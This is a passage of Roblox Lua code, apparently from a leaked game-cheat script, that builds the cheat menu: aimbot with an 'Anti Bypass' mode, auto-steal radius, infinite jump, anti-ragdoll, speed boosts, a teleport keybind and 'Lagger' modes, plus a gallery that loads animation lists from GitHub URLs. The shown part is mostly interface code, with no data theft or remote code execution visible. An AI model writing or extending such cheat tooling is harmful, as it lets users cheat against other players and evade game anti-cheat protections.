        card.AutoButtonColor = false
        card.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
        card.BackgroundTransparency = 0.07
        card.BorderSizePixel = 0
        card.LayoutOrder = order
        card.ZIndex = 4
        card.Parent = scroll
        corner(card,11)
        stroke(card,COLORS.strokeSoft,1,0.55)

        local img = Instance.new("ImageLabel")
        img.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
        img.BackgroundTransparency = 0.12
        img.BorderSizePixel = 0
        img.Image = "rbxthumb://type=BundleThumbnail&id=" .. tostring(item.id) .. "&w=150&h=150"
        img.ScaleType = Enum.ScaleType.Fit
        img.Position = UDim2.new(0,7,0,7)
        img.Size = UDim2.new(1,-14,0,92)
        img.ZIndex = 5
        img.Parent = card
        corner(img,8)

        local name = Instance.new("TextLabel")
        name.BackgroundTransparency = 1
        name.Text = tostring(item.name or ("Animation " .. tostring(item.id)))
        name.TextColor3 = COLORS.white
        name.Font = Enum.Font.GothamMedium
        name.TextSize = 10
        name.TextWrapped = true
        name.TextYAlignment = Enum.TextYAlignment.Top
        name.Position = UDim2.new(0,6,0,104)
        name.Size = UDim2.new(1,-12,0,32)
        name.ZIndex = 5
        name.Parent = card

        card.MouseButton1Click:Connect(function()
            applyFullAnimationBundle(item)
            if sg and sg.Parent then
                sg:Destroy()
            end
        end)
    end

    local function render()
        clearCards()
        local q = (searchBox.Text or ""):lower()
        local count = 0
        for _, item in ipairs(allAnimations) do
            local match = q == "" or tostring(item.id) == q or tostring(item.name or ""):lower():find(q,1,true)
            if match then
                count += 1
                addCard(item,count)
            end
        end
        status.Text = tostring(count) .. " animation bundles"
    end

    searchBox:GetPropertyChangedSignal("Text"):Connect(function()
        task.defer(render)
    end)

    close.MouseButton1Click:Connect(function() sg:Destroy() end)
    --Leaked By Xlu0 AndPrime--

    task.spawn(function()
        local seen = {}
        local urls = {
            "https://raw.githubusercontent.com/7yd7/sniper-Emote/refs/heads/test/AnimationSniper.json",
            "https://raw.githubusercontent.com/7yd7/sniper-Emote/refs/heads/test/AnimationSniperoffsale.json"
        }

        for _, url in ipairs(urls) do
            local ok, body = pcall(function() return game:HttpGet(url) end)
            if ok and body and body ~= "" then
                local ok2, data = pcall(function() return HttpService:JSONDecode(body) end)
                if ok2 and data then
                    for _, item in pairs(data.data or {}) do
                        local id = tonumber(item.id)
                        if id and id > 0 and not seen[id] and item.bundledItems then
                            seen[id] = true
                            table.insert(allAnimations, {
                                id = id,
                                name = item.name or ("Animation_" .. tostring(id)),
                                bundledItems = item.bundledItems
                            })
                        end
                    end
                end
            end
        end

        table.sort(allAnimations,function(a,b)
            return tostring(a.name or ""):lower() < tostring(b.name or ""):lower()
        end)
        render()
    end)
end

more.MouseButton1Click:Connect(openAnimationGallery)

local right = Instance.new("TextButton")
right.Name = "RightArrow"
right.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
right.BackgroundTransparency = 0.18
right.Text = ">"
right.TextColor3 = COLORS.white
right.TextSize = 12
right.Font = Enum.Font.GothamMedium
right.Size = UDim2.new(0,44,0,25)
right.Position = UDim2.new(1,-44,0,22)
right.BorderSizePixel = 0
right.ZIndex = 6
right.Parent = row
corner(right, 7)
stroke(right, COLORS.strokeSoft, 1, 0.45)
local function setPackIndex(nextIndex)
if nextIndex < 1 then nextIndex = #AnimationPackList end
if nextIndex > #AnimationPackList then nextIndex = 1 end

AnimationPackIndex = nextIndex
local chosenPack = AnimationPackList[AnimationPackIndex] or "OFF"
_G.SoundSelectedMoreAnimationBundle = nil

--Leaked By Xlu0 AndPrime--
selectedAnimationPack = chosenPack

--Leaked By Xlu0 AndPrime--
if rowAnimationPackValueLabel and rowAnimationPackValueLabel.Parent then
    rowAnimationPackValueLabel.Text = chosenPack
end
refreshAnimationPackRow()

--Leaked By Xlu0 AndPrime--
--Leaked By Xlu0 AndPrime--
applyAnimationPack(chosenPack)

--Leaked By Xlu0 AndPrime--
task.defer(function()
    if rowAnimationPackValueLabel and rowAnimationPackValueLabel.Parent then
        rowAnimationPackValueLabel.Text = chosenPack
    end
    if selectedAnimationPack == chosenPack then
        refreshAnimationPackRow()
    end
end)

if saveSoundConfig then pcall(saveSoundConfig) end
end
left.MouseButton1Click:Connect(function()
setPackIndex(AnimationPackIndex - 1)
end)
right.MouseButton1Click:Connect(function()
setPackIndex(AnimationPackIndex + 1)
end)
return row
end
function keyName(key)
if not key then return "None" end
local name = tostring(key):gsub("Enum.KeyCode.", "")
name = name:gsub("Button", "BTN ")
name = name:gsub("DPad", "DPad ")
return name
end
function refreshSpeedKeybindButton(keyId)
local btn = speedKeybindButtons[keyId]
if btn then
if listeningForSpeedKey == keyId then
btn.Text = "Press..."
else
btn.Text = keyName(speedKeybinds[keyId])
end
end
end
function refreshAllSpeedKeybinds()
for keyId in pairs(speedKeybindButtons) do
refreshSpeedKeybindButton(keyId)
end
end
function refreshTPDownKeybind()
if tpDownKeybindButton then
tpDownKeybindButton.Text = listeningForTPDownKey and "Press..." or keyName(tpDownKeybind)
end
end
function tpDownKeybindRow(parent, order)
local row = baseRow(parent, "TP Down", order)
local btn = Instance.new("TextButton")
btn.Name = "TPDownKeybindButton"
btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
btn.BackgroundTransparency = 0.18
btn.Text = keyName(tpDownKeybind)
btn.TextColor3 = COLORS.white
btn.TextSize = 11
btn.TextScaled = true
btn.TextWrapped = false
btn.TextXAlignment = Enum.TextXAlignment.Center
btn.Font = Enum.Font.GothamBold
btn.Size = UDim2.new(0, 56, 0, 24)
btn.Position = UDim2.new(1, -64, 0.5, -12)
do local _tsc = Instance.new("UITextSizeConstraint"); _tsc.MaxTextSize = 11; _tsc.MinTextSize = 6; _tsc.Parent = btn end
btn.BorderSizePixel = 0
btn.ZIndex = 6
btn.AutoButtonColor = false
btn.Parent = row
corner(btn, 14)
stroke(btn, COLORS.strokeSoft, 1, 0.45)
local clearBtn = Instance.new("TextButton")
clearBtn.Name = "ClearKeybindButton"
clearBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
clearBtn.BackgroundTransparency = 0.18
clearBtn.Text = "\u{00D7}"
clearBtn.TextColor3 = COLORS.white
clearBtn.TextSize = 16
clearBtn.Font = Enum.Font.GothamBold
clearBtn.Size = UDim2.new(0, 22, 0, 24)
clearBtn.Position = UDim2.new(1, -90, 0.5, -12)
clearBtn.BorderSizePixel = 0
clearBtn.ZIndex = 6
clearBtn.AutoButtonColor = false
clearBtn.Parent = row
corner(clearBtn, 7)
stroke(clearBtn, COLORS.strokeSoft, 1, 0.45)
tpDownKeybindButton = btn
btn.Activated:Connect(function()
listeningForSpeedKey = nil
listeningForTPDownKey = true
keybindListenStartedAt = tick()
refreshAllSpeedKeybinds()
refreshTPDownKeybind()
end)
clearBtn.Activated:Connect(function()
listeningForSpeedKey = nil
listeningForTPDownKey = false
tpDownKeybind = nil
if tpDownKeybindButton then tpDownKeybindButton.Text = "None" end
refreshAllSpeedKeybinds()
refreshTPDownKeybind()
if saveSoundConfig then pcall(saveSoundConfig) end
end)
return row, btn
end
function speedKeybindRow(parent, labelText, keyId, order)
local row = baseRow(parent, labelText, order)
local btn = Instance.new("TextButton")
btn.Name = "KeybindButton"
btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
btn.BackgroundTransparency = 0.18
btn.Text = keyName(speedKeybinds[keyId])
btn.TextColor3 = COLORS.white
btn.TextSize = 11
btn.TextScaled = true
btn.TextWrapped = false
btn.TextXAlignment = Enum.TextXAlignment.Center
btn.Font = Enum.Font.GothamBold
btn.Size = UDim2.new(0, 56, 0, 24)
btn.Position = UDim2.new(1, -64, 0.5, -12)
do local _tsc = Instance.new("UITextSizeConstraint"); _tsc.MaxTextSize = 11; _tsc.MinTextSize = 6; _tsc.Parent = btn end
btn.BorderSizePixel = 0
btn.ZIndex = 6
btn.AutoButtonColor = false
btn.Parent = row
corner(btn, 14)
stroke(btn, COLORS.strokeSoft, 1, 0.45)
local clearBtn = Instance.new("TextButton")
clearBtn.Name = "ClearKeybindButton"
clearBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
clearBtn.BackgroundTransparency = 0.18
clearBtn.Text = "\u{00D7}"
clearBtn.TextColor3 = COLORS.white
clearBtn.TextSize = 16
clearBtn.Font = Enum.Font.GothamBold
clearBtn.Size = UDim2.new(0, 22, 0, 24)
clearBtn.Position = UDim2.new(1, -90, 0.5, -12)
clearBtn.BorderSizePixel = 0
clearBtn.ZIndex = 6
clearBtn.AutoButtonColor = false
clearBtn.Parent = row
corner(clearBtn, 7)
stroke(clearBtn, COLORS.strokeSoft, 1, 0.45)
speedKeybindButtons[keyId] = btn
btn.Activated:Connect(function()
listeningForSpeedKey = keyId
listeningForTPDownKey = false
keybindListenStartedAt = tick()
refreshAllSpeedKeybinds()
refreshTPDownKeybind()
end)
clearBtn.Activated:Connect(function()
listeningForSpeedKey = nil
listeningForTPDownKey = false
speedKeybinds[keyId] = nil
if speedKeybindButtons[keyId] then speedKeybindButtons[keyId].Text = "None" end
refreshAllSpeedKeybinds()
refreshTPDownKeybind()
if saveSoundConfig then pcall(saveSoundConfig) end
end)
return row, btn
end
local normalModeValueLabel = nil
local laggerModeValueLabel = nil
local aimbotButtonLabel = nil
local aimbotSpeedLabel = nil
local laggerAimbotSpeedLabel = nil
local combatAimbotKeybindLabel = nil
function getAimbotModeDisplay()
if selectedAimbotMode == "Anti Bypass" or selectedAimbotMode == "Bypass" then
return "Anti Bypass"
end
return "Normal"
end
function refreshAimbotButtonLabel()
if aimbotButtonLabel then
aimbotButtonLabel.Text = getAimbotModeDisplay() .. " Aimbot"
end
end
function refreshAimbotModeLabels()
local modeName = getAimbotModeDisplay()
if aimbotSpeedLabel then
aimbotSpeedLabel.Text = modeName .. " Aimbot Speed"
end
if laggerAimbotSpeedLabel then
laggerAimbotSpeedLabel.Text = modeName .. " Lagger Aimbot Speed"
end
if combatAimbotKeybindLabel then
combatAimbotKeybindLabel.Text = modeName .. " Aimbot"
end
refreshAimbotButtonLabel()
end
refreshSpeedModeRows = function()
if normalModeValueLabel then
normalModeValueLabel.Text = (currentSpeedMode == "Carry") and "Carry" or "Normal"
end
if laggerModeValueLabel then
laggerModeValueLabel.Text = (currentSpeedMode == "Lagger Carry") and "Lagger Carry" or "Lagger"
end
end
function modeDisplayRow(parent, order, side)
local row = baseRow(parent, "Mode", order)
row.Size = UDim2.new(1, -4, 0, 34)
row.BackgroundTransparency = 0.3
local label = row:FindFirstChild("Label")
if label then
label.Text = "Mode"
label.TextSize = 11
label.Size = UDim2.new(1, -132, 1, 0)
label.Position = UDim2.new(0, 12, 0, 0)
label.TextColor3 = Color3.fromRGB(245, 245, 245)
end
local value = Instance.new("TextLabel")
value.Name = "ModeValue"
value.BackgroundTransparency = 1
value.Text = side == "Normal" and "Normal" or "Lagger"
value.TextColor3 = Color3.fromRGB(255, 255, 255)
value.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
value.TextStrokeTransparency = 1
value.TextSize = 12
value.Font = Enum.Font.GothamMedium
value.TextXAlignment = Enum.TextXAlignment.Right
value.Position = UDim2.new(1, -150, 0, 0)
value.Size = UDim2.new(0, 138, 1, 0)
value.ZIndex = 6
value.Parent = row
local click = Instance.new("TextButton")
click.Name = "ModeClick"
click.BackgroundTransparency = 1
click.Text = ""
click.Size = UDim2.new(1, 0, 1, 0)
click.Position = UDim2.new(0, 0, 0, 0)
click.AutoButtonColor = false
click.ZIndex = 8
click.Parent = row
if side == "Normal" then
normalModeValueLabel = value
click.MouseButton1Click:Connect(function()
setSpeedMode(currentSpeedMode == "Normal" and "Carry" or "Normal")
end)
else
laggerModeValueLabel = value
click.MouseButton1Click:Connect(function()
setSpeedMode(currentSpeedMode == "Lagger" and "Lagger Carry" or "Lagger")
end)
end
refreshSpeedModeRows()
return row, value
end
function aimbotModeButtonRow(parent, order)
local row, setVisual = toggleRow(parent, tostring(selectedAimbotMode) .. " Aimbot", false, order)
aimbotButtonLabel = row and row:FindFirstChild("Label")
_G.SoundAimbotSetVisual = setVisual
refreshAimbotButtonLabel()
if _G.SoundRefreshAimbotVisual then _G.SoundRefreshAimbotVisual() end

local toggleBtn = row and row:FindFirstChild("ToggleButton")
if toggleBtn then
toggleBtn.Size = UDim2.new(0, 54, 1, 0)
toggleBtn.Position = UDim2.new(1, -54, 0, 0)
toggleBtn.Activated:Connect(function()
if _G.SoundToggleSelectedAimbot then
_G.SoundToggleSelectedAimbot()
end
end)
end

return row, setVisual, nil
end
_G.SoundAimbotSelectorRow = function(parent, order)
return nil, nil
end
function autoStealSelectorRow(parent, order)
local holder = Instance.new("Frame")
holder.Name = "Auto Steal Mode"
holder.BackgroundColor3 = COLORS.row
holder.BackgroundTransparency = 0.28
holder.Size = UDim2.new(1, -4, 0, 42)
holder.BorderSizePixel = 0
holder.LayoutOrder = order
holder.ZIndex = 4
holder.ClipsDescendants = true
holder.Parent = parent
corner(holder, 9)
stroke(holder, COLORS.strokeSoft, 1.15, 0.38)
local slide = Instance.new("Frame")
slide.Name = "SelectedSlide"
slide.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
slide.BackgroundTransparency = 0.08
slide.Size = UDim2.new(0.5, -3, 1, -8)
slide.Position = UDim2.new(0, 4, 0, 4)
slide.BorderSizePixel = 0
slide.ZIndex = 5
slide.Parent = holder
corner(slide, 9)
local slideStroke = Instance.new("UIStroke")
slideStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
slideStroke.Color = Color3.fromRGB(236, 236, 236)
slideStroke.Thickness = 1
slideStroke.Transparency = 0.08
slideStroke.Parent = slide
local slideGradient = Instance.new("UIGradient")
slideGradient.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(24, 24, 24)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(47, 47, 47)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 22)),
})
slideGradient.Transparency = NumberSequence.new({
NumberSequenceKeypoint.new(0, 0.08),
NumberSequenceKeypoint.new(0.5, 0.02),
NumberSequenceKeypoint.new(1, 0.08),
})
slideGradient.Parent = slide
local normalText = Instance.new("TextLabel")
normalText.Name = "NormalText"
normalText.BackgroundTransparency = 1
normalText.Text = "AUTO STEAL V3"
normalText.TextColor3 = COLORS.white
normalText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
normalText.TextStrokeTransparency = 1
normalText.TextSize = 11
normalText.Font = Enum.Font.GothamMedium
normalText.TextXAlignment = Enum.TextXAlignment.Center
normalText.Size = UDim2.new(0.5, 0, 1, 0)
normalText.Position = UDim2.new(0, 0, 0, 0)
normalText.ZIndex = 8
normalText.Parent = holder
local semiText = Instance.new("TextLabel")
semiText.Name = "SemiText"
semiText.BackgroundTransparency = 1
semiText.Text = "SEMI"
semiText.TextColor3 = COLORS.white
semiText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
semiText.TextStrokeTransparency = 1
semiText.TextSize = 11
semiText.Font = Enum.Font.GothamMedium
semiText.TextXAlignment = Enum.TextXAlignment.Center
semiText.Size = UDim2.new(0.5, 0, 1, 0)
semiText.Position = UDim2.new(0.5, 0, 0, 0)
semiText.ZIndex = 8
semiText.Parent = holder
local normalClick = Instance.new("TextButton")
normalClick.Name = "NormalClick"
normalClick.BackgroundTransparency = 1
normalClick.Text = ""
normalClick.AutoButtonColor = false
normalClick.Size = UDim2.new(0.5, 0, 1, 0)
normalClick.Position = UDim2.new(0, 0, 0, 0)
normalClick.ZIndex = 10
normalClick.Parent = holder
local semiClick = Instance.new("TextButton")
semiClick.Name = "SemiClick"
semiClick.BackgroundTransparency = 1
semiClick.Text = ""
semiClick.AutoButtonColor = false
semiClick.Size = UDim2.new(0.5, 0, 1, 0)
semiClick.Position = UDim2.new(0.5, 0, 0, 0)
semiClick.ZIndex = 10
semiClick.Parent = holder
local function setMode(mode)
if mode ~= "Semi" then
mode = "Auto Steal V3"
end
_G.SoundStealRadii = _G.SoundStealRadii or {Normal = 62, Semi = 9}
_G.SoundStealRadii[selectedStealMode] = tonumber(autoStealRadius) or _G.SoundStealRadii[selectedStealMode]
selectedStealMode = mode
autoStealRadius = _G.SoundStealRadii[selectedStealMode] or ((selectedStealMode == "Semi") and 9 or 63)
if autoStealRadiusBox then
autoStealRadiusBox.Text = tostring(autoStealRadius)
end
if saveSoundConfig then pcall(saveSoundConfig) end
if _G.SoundNormalAutoStealSetRadius then _G.SoundNormalAutoStealSetRadius(_G.SoundStealRadii.Normal or 62) end
if _G.SoundSemiAutoStealSetRadius then _G.SoundSemiAutoStealSetRadius(_G.SoundStealRadii.Semi or 9) end
if _G.SoundAutoStealSync then _G.SoundAutoStealSync() end
local onSemi = selectedStealMode == "Semi"
tween(slide, {
Position = onSemi and UDim2.new(0.5, -1, 0, 4) or UDim2.new(0, 4, 0, 4)
}, 0.18)
tween(normalText, {
TextTransparency = onSemi and 0.18 or 0,
TextStrokeTransparency = onSemi and 0.38 or 0.2
}, 0.14)
tween(semiText, {
TextTransparency = onSemi and 0 or 0.18,
TextStrokeTransparency = onSemi and 0.2 or 0.38
}, 0.14)
end
normalClick.MouseButton1Click:Connect(function()
setMode("Auto Steal V3")
end)
semiClick.MouseButton1Click:Connect(function()
setMode("Semi")
end)
setMode(selectedStealMode)
return holder, setMode
end

function infiniteJumpSelectorRow(parent, order)
local holder = Instance.new("Frame")
holder.Name = "Infinite Jump Mode"
holder.BackgroundColor3 = COLORS.row
holder.BackgroundTransparency = 0.28
holder.Size = UDim2.new(1, -4, 0, 42)
holder.BorderSizePixel = 0
holder.LayoutOrder = order
holder.ZIndex = 4
holder.ClipsDescendants = true
holder.Parent = parent
corner(holder, 9)
stroke(holder, COLORS.strokeSoft, 1.15, 0.38)

local slide = Instance.new("Frame")
slide.Name = "SelectedSlide"
slide.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
slide.BackgroundTransparency = 0.08
slide.Size = UDim2.new(0.5, -3, 1, -8)
slide.Position = UDim2.new(0, 4, 0, 4)
slide.BorderSizePixel = 0
slide.ZIndex = 5
slide.Parent = holder
corner(slide, 9)

local slideStroke = Instance.new("UIStroke")
slideStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
slideStroke.Color = Color3.fromRGB(236, 236, 236)
slideStroke.Thickness = 1
slideStroke.Transparency = 0.08
slideStroke.Parent = slide

local slideGradient = Instance.new("UIGradient")
slideGradient.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(24, 24, 24)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(47, 47, 47)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 22)),
})
slideGradient.Transparency = NumberSequence.new({
NumberSequenceKeypoint.new(0, 0.08),
NumberSequenceKeypoint.new(0.5, 0.02),
NumberSequenceKeypoint.new(1, 0.08),
})
slideGradient.Parent = slide

local tapText = Instance.new("TextLabel")
tapText.Name = "TapText"
tapText.BackgroundTransparency = 1
tapText.Text = "TAP"
tapText.TextColor3 = COLORS.white
tapText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
tapText.TextStrokeTransparency = 1
tapText.TextSize = 11
tapText.Font = Enum.Font.GothamMedium
tapText.TextXAlignment = Enum.TextXAlignment.Center
tapText.Size = UDim2.new(0.5, 0, 1, 0)
tapText.Position = UDim2.new(0, 0, 0, 0)
tapText.ZIndex = 8
tapText.Parent = holder

local holdText = Instance.new("TextLabel")
holdText.Name = "HoldText"
holdText.BackgroundTransparency = 1
holdText.Text = "HOLD"
holdText.TextColor3 = COLORS.white
holdText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
holdText.TextStrokeTransparency = 1
holdText.TextSize = 11
holdText.Font = Enum.Font.GothamMedium
holdText.TextXAlignment = Enum.TextXAlignment.Center
holdText.Size = UDim2.new(0.5, 0, 1, 0)
holdText.Position = UDim2.new(0.5, 0, 0, 0)
holdText.ZIndex = 8
holdText.Parent = holder

local tapClick = Instance.new("TextButton")
tapClick.Name = "TapClick"
tapClick.BackgroundTransparency = 1
tapClick.Text = ""
tapClick.AutoButtonColor = false
tapClick.Size = UDim2.new(0.5, 0, 1, 0)
tapClick.Position = UDim2.new(0, 0, 0, 0)
tapClick.ZIndex = 10
tapClick.Parent = holder

local holdClick = Instance.new("TextButton")
holdClick.Name = "HoldClick"
holdClick.BackgroundTransparency = 1
holdClick.Text = ""
holdClick.AutoButtonColor = false
holdClick.Size = UDim2.new(0.5, 0, 1, 0)
holdClick.Position = UDim2.new(0.5, 0, 0, 0)
holdClick.ZIndex = 10
holdClick.Parent = holder

local function setMode(mode)
if mode ~= "Hold" then
mode = "Tap"
end
_G.SoundInfJumpMode = mode
if _G.SoundStopNormalInfJumpHoldState then
_G.SoundStopNormalInfJumpHoldState()
end
if saveSoundConfig then pcall(saveSoundConfig) end

local onHold = _G.SoundInfJumpMode == "Hold"
tween(slide, {
Position = onHold and UDim2.new(0.5, -1, 0, 4) or UDim2.new(0, 4, 0, 4)
}, 0.18)
tween(tapText, {
TextTransparency = onHold and 0.18 or 0,
TextStrokeTransparency = onHold and 0.38 or 0.2
}, 0.14)
tween(holdText, {
TextTransparency = onHold and 0 or 0.18,
TextStrokeTransparency = onHold and 0.2 or 0.38
}, 0.14)
end

tapClick.MouseButton1Click:Connect(function()
setMode("Tap")
end)

holdClick.MouseButton1Click:Connect(function()
setMode("Hold")
end)

setMode(_G.SoundInfJumpMode)
return holder, setMode
end


function antiRagdollSelectorRow(parent, order)
local holder = Instance.new("Frame")
holder.Name = "Anti Ragdoll Mode"
holder.BackgroundColor3 = COLORS.row
holder.BackgroundTransparency = 0.28
holder.Size = UDim2.new(1, -4, 0, 42)
holder.BorderSizePixel = 0
holder.LayoutOrder = order
holder.ZIndex = 4
holder.ClipsDescendants = true
holder.Parent = parent
corner(holder, 9)
stroke(holder, COLORS.strokeSoft, 1.15, 0.38)

local slide = Instance.new("Frame")
slide.Name = "SelectedSlide"
slide.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
slide.BackgroundTransparency = 0.08
slide.Size = UDim2.new(0.5, -3, 1, -8)
slide.Position = UDim2.new(0, 4, 0, 4)
slide.BorderSizePixel = 0
slide.ZIndex = 5
slide.Parent = holder
corner(slide, 9)

local slideStroke = Instance.new("UIStroke")
slideStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
slideStroke.Color = Color3.fromRGB(236, 236, 236)
slideStroke.Thickness = 1
slideStroke.Transparency = 0.08
slideStroke.Parent = slide

local slideGradient = Instance.new("UIGradient")
slideGradient.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(24, 24, 24)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(47, 47, 47)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 22)),
})
slideGradient.Parent = slide

local v1Text = Instance.new("TextLabel")
v1Text.BackgroundTransparency = 1
v1Text.Text = "ANTI RAGDOLL V1"
v1Text.TextColor3 = COLORS.white
v1Text.TextSize = 9
v1Text.Font = Enum.Font.GothamMedium
v1Text.Size = UDim2.new(0.5, 0, 1, 0)
v1Text.ZIndex = 8
v1Text.Parent = holder

local v2Text = Instance.new("TextLabel")
v2Text.BackgroundTransparency = 1
v2Text.Text = "ANTI RAGDOLL V2"
v2Text.TextColor3 = COLORS.white
v2Text.TextSize = 9
v2Text.Font = Enum.Font.GothamMedium
v2Text.Size = UDim2.new(0.5, 0, 1, 0)
v2Text.Position = UDim2.new(0.5, 0, 0, 0)
v2Text.ZIndex = 8
v2Text.Parent = holder

local v1Click = Instance.new("TextButton")
v1Click.BackgroundTransparency = 1
v1Click.Text = ""
v1Click.AutoButtonColor = false
v1Click.Size = UDim2.new(0.5, 0, 1, 0)
v1Click.ZIndex = 10
v1Click.Parent = holder

local v2Click = Instance.new("TextButton")
v2Click.BackgroundTransparency = 1
v2Click.Text = ""
v2Click.AutoButtonColor = false
v2Click.Size = UDim2.new(0.5, 0, 1, 0)
v2Click.Position = UDim2.new(0.5, 0, 0, 0)
v2Click.ZIndex = 10
v2Click.Parent = holder

local function setMode(mode)
_G.SoundAntiRagdollMode = (mode == "V2") and "V2" or "V1"

local onV2 = _G.SoundAntiRagdollMode == "V2"
tween(slide, {
Position = onV2 and UDim2.new(0.5, -1, 0, 4) or UDim2.new(0, 4, 0, 4)
}, 0.18)

tween(v1Text, {
TextTransparency = onV2 and 0.18 or 0,
TextStrokeTransparency = onV2 and 0.38 or 0.2
}, 0.14)

tween(v2Text, {
TextTransparency = onV2 and 0 or 0.18,
TextStrokeTransparency = onV2 and 0.2 or 0.38
}, 0.14)

if antiRagdollEnabled then
setAntiRagdoll(true)
end

if saveSoundConfig then pcall(saveSoundConfig) end
end

v1Click.MouseButton1Click:Connect(function()
setMode("V1")
end)

v2Click.MouseButton1Click:Connect(function()
setMode("V2")
end)

setMode(_G.SoundAntiRagdollMode)
return holder, setMode
end


function dropModeSelectorRow(parent, order)
local holder = Instance.new("Frame")
holder.Name = "Drop Mode"
holder.BackgroundColor3 = COLORS.row
holder.BackgroundTransparency = 0.28
holder.Size = UDim2.new(1, -4, 0, 42)
holder.BorderSizePixel = 0
holder.LayoutOrder = order
holder.ZIndex = 4
holder.ClipsDescendants = true
holder.Parent = parent
corner(holder, 9)
stroke(holder, COLORS.strokeSoft, 1.15, 0.38)

local slide = Instance.new("Frame")
slide.Name = "SelectedSlide"
slide.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
slide.BackgroundTransparency = 0.08
slide.Size = UDim2.new(0.5, -3, 1, -8)
slide.Position = UDim2.new(0, 4, 0, 4)
slide.BorderSizePixel = 0
slide.ZIndex = 5
slide.Parent = holder
corner(slide, 9)

local st = Instance.new("UIStroke")
st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
st.Color = Color3.fromRGB(236, 236, 236)
st.Thickness = 1
st.Transparency = 0.08
st.Parent = slide

local standText = Instance.new("TextLabel")
standText.BackgroundTransparency = 1
standText.Text = "STAND DROP"
standText.TextColor3 = COLORS.white
standText.TextSize = 10
standText.Font = Enum.Font.GothamMedium
standText.Size = UDim2.new(0.5,0,1,0)
standText.ZIndex = 8
standText.Parent = holder

local jumpText = Instance.new("TextLabel")
jumpText.BackgroundTransparency = 1
jumpText.Text = "JUMP DROP"
jumpText.TextColor3 = COLORS.white
jumpText.TextSize = 10
jumpText.Font = Enum.Font.GothamMedium
jumpText.Size = UDim2.new(0.5,0,1,0)
jumpText.Position = UDim2.new(0.5,0,0,0)
jumpText.ZIndex = 8
jumpText.Parent = holder

local standClick = Instance.new("TextButton")
standClick.BackgroundTransparency = 1
standClick.Text = ""
standClick.AutoButtonColor = false
standClick.Size = UDim2.new(0.5,0,1,0)
standClick.ZIndex = 10
standClick.Parent = holder

local jumpClick = Instance.new("TextButton")
jumpClick.BackgroundTransparency = 1
jumpClick.Text = ""
jumpClick.AutoButtonColor = false
jumpClick.Size = UDim2.new(0.5,0,1,0)
jumpClick.Position = UDim2.new(0.5,0,0,0)
jumpClick.ZIndex = 10
jumpClick.Parent = holder

local function setMode(mode)
_G.SoundDropMode = (mode == "Jump Drop") and "Jump Drop" or "Stand Drop"
local jump = _G.SoundDropMode == "Jump Drop"

tween(slide, {
Position = jump and UDim2.new(0.5,-1,0,4) or UDim2.new(0,4,0,4)
}, 0.18)

tween(standText, {TextTransparency = jump and 0.18 or 0}, 0.14)
tween(jumpText, {TextTransparency = jump and 0 or 0.18}, 0.14)

if saveSoundConfig then pcall(saveSoundConfig) end
end

standClick.MouseButton1Click:Connect(function() setMode("Stand Drop") end)
jumpClick.MouseButton1Click:Connect(function() setMode("Jump Drop") end)

setMode(_G.SoundDropMode)
return holder, setMode
end

--Leaked By Xlu0 AndPrime--
--Leaked By Xlu0 AndPrime--
task.wait()
Movement = pages.MOVEMENT

section(Movement, "AUTO SPEED", -2)
_, setAutoCarrySpeedVisual = toggleRow(Movement, "Auto Carry Speed", autoCarrySpeedEnabled, -1)
do
local row = Movement:FindFirstChild("Auto Carry Speed")
_aceBtn = row and row:FindFirstChild("ToggleButton")
if _aceBtn then
_aceBtn.Activated:Connect(function()
autoCarrySpeedEnabled = not autoCarrySpeedEnabled
if autoCarrySpeedEnabled ~= true and _G.AutoCarrySpeed and _G.AutoCarrySpeed.Disable then
_G.AutoCarrySpeed.Disable()
end
if setAutoCarrySpeedVisual then setAutoCarrySpeedVisual(autoCarrySpeedEnabled == true) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
section(Movement, "NORMAL SPEED", 1)
_, normalSpeedBox = textboxRow(Movement, "Normal Speed", tostring(NS), 2)
normalSpeedBox.FocusLost:Connect(function()
local v = tonumber(normalSpeedBox.Text)
if v and v > 0 and v <= 250 then
NS = v
if saveSoundConfig then pcall(saveSoundConfig) end
end
normalSpeedBox.Text = tostring(NS)
end)
_, carrySpeedBox = textboxRow(Movement, "Carry Speed", tostring(CS), 3)
carrySpeedBox.FocusLost:Connect(function()
local v = tonumber(carrySpeedBox.Text)
if v and v > 0 and v <= 250 then
CS = v
if saveSoundConfig then pcall(saveSoundConfig) end
end
carrySpeedBox.Text = tostring(CS)
end)
modeDisplayRow(Movement, 4, "Normal")
section(Movement, "LAGGER SPEED", 5)
_, laggerSpeedBox = textboxRow(Movement, "Lagger Speed", tostring(LAGGER_SPEED), 6)
laggerSpeedBox.FocusLost:Connect(function()
local v = tonumber(laggerSpeedBox.Text)
if v and v > 0 and v <= 250 then
LAGGER_SPEED = v
if saveSoundConfig then pcall(saveSoundConfig) end
end
laggerSpeedBox.Text = tostring(LAGGER_SPEED)
end)
_, laggerCarrySpeedBox = textboxRow(Movement, "Lagger Carry Speed", tostring(LAGGER_CARRY_SPEED), 7)
